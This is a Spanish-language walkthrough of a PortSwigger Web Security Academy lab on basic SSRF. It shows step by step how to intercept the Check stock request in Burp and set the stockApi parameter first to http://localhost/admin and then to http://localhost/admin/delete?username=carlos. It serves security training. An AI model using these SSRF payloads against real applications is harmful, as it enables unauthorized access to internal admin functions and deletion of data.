# Lab — Basic SSRF against the local server

> **Fuente principal:** solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

La aplicación tiene una función **Check stock** que hace una petición server-side a otra URL.

Debemos hacer que esa función acceda al panel administrativo local:

```text
http://localhost/admin
```

y usarlo para eliminar a:

```text
carlos
```

---

# Qué está enseñando PortSwigger

El navegador no puede acceder directamente al panel administrativo, pero el propio servidor sí puede.

```text
Nuestro navegador ──X──> /admin

Nuestro navegador
      ↓
stockApi=http://localhost/admin
      ↓
servidor vulnerable
      ↓
servidor ────────> su propio /admin
```

Esto es SSRF contra el **local server**.

---

# Procedimiento oficial paso a paso

## Paso 1 — Comprobar que `/admin` está restringido

Desde el navegador del lab intenta abrir:

```text
/admin
```

Debes observar que no puedes acceder directamente.

Esto crea nuestra baseline:

```text
cliente externo → /admin → bloqueado
```

---

## Paso 2 — Abrir un producto

1. Regresa a la tienda.
2. Abre cualquier producto.
3. Localiza el botón:

```text
Check stock
```

Todavía no lo pulses si quieres preparar primero Burp.

---

## Paso 3 — Activar Intercept

En Burp:

```text
Proxy
→ Intercept
→ Intercept is ON
```

Ahora vuelve al navegador y pulsa:

```text
Check stock
```

Burp debe detener una request relacionada con el stock.

---

## Paso 4 — Identificar la request importante

Busca una request aproximadamente así:

```http
POST /product/stock HTTP/2
Host: TU-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://...
```

El nombre importante es:

```text
stockApi
```

### Qué significa

El navegador no está consultando directamente el sistema de stock.

Está diciéndole al servidor:

```text
"consulta esta URL por mí"
```

---

## Paso 5 — Send to Repeater

Con la request interceptada:

```text
clic derecho
→ Send to Repeater
```

Luego puedes hacer **Forward** para no dejar el navegador detenido y apagar Intercept si quieres:

```text
Proxy → Intercept → Intercept is OFF
```

Ahora abre:

```text
Repeater
```

---

## Paso 6 — Cambiar `stockApi`

En Repeater modifica únicamente el valor de `stockApi`.

De algo similar a:

```text
stockApi=http://stock...
```

pasa a:

```text
stockApi=http://localhost/admin
```

Pulsa:

```text
Send
```

---

# Resultado esperado

La Response debería contener el HTML de la interfaz administrativa.

Busca elementos como:

```text
Admin
Users
carlos
Delete
```

Si ves eso, acabas de confirmar SSRF.

El servidor realizó por ti:

```http
GET http://localhost/admin
```

---

## Paso 7 — Encontrar la URL de eliminación

Lee la Response del panel administrativo.

PortSwigger indica que la acción para eliminar al usuario utiliza:

```text
/admin/delete?username=carlos
```

Por tanto, el destino completo que queremos que consulte el servidor es:

```text
http://localhost/admin/delete?username=carlos
```

---

## Paso 8 — Enviar el SSRF final

En Repeater cambia:

```text
stockApi=http://localhost/admin
```

por:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

Pulsa:

```text
Send
```

Si la operación se ejecuta correctamente, el usuario será eliminado y el lab debería marcarse como **Solved**.

---

# Qué debo identificar visualmente en Burp

## Request

La parte importante es el body:

```http
stockApi=...
```

## Response

Primero esperamos contenido del admin panel.

Después de enviar la URL de eliminación podemos recibir una respuesta/redirect diferente. Lo importante es comprobar el estado del lab.

---

# Qué NO estamos haciendo

No estamos navegando directamente a:

```text
http://localhost/admin
```

Eso tendría sentido solo desde la máquina del servidor.

Estamos enviando la URL como **dato** a la aplicación vulnerable:

```text
stockApi=http://localhost/admin
```

para que **ella** realice la petición.

---

# Por qué funciona

La aplicación permite controlar el destino de una petición server-side.

Además, el panel `/admin` aplica una restricción distinta según desde dónde provenga la petición.

Conceptualmente:

```text
petición externa → no confiable → admin bloqueado
petición local   → confiable    → admin permitido
```

SSRF transforma nuestra entrada externa en una petición local.

---

# Burp que tengo que aprender aquí

- [ ] `Proxy → Intercept`.
- [ ] Encontrar `POST /product/stock`.
- [ ] Reconocer un body `application/x-www-form-urlencoded`.
- [ ] Identificar el parámetro `stockApi`.
- [ ] `Send to Repeater`.
- [ ] Cambiar solo un valor en Repeater.
- [ ] Leer HTML de la Response.
- [ ] Encontrar un endpoint dentro de la respuesta y reutilizarlo.

---

# Resumen de 20 segundos

```text
/admin directo → bloqueado
        ↓
producto → Check stock
        ↓
interceptar POST /product/stock
        ↓
Send to Repeater
        ↓
stockApi=http://localhost/admin
        ↓
veo admin panel en Response
        ↓
stockApi=http://localhost/admin/delete?username=carlos
        ↓
Solved
```
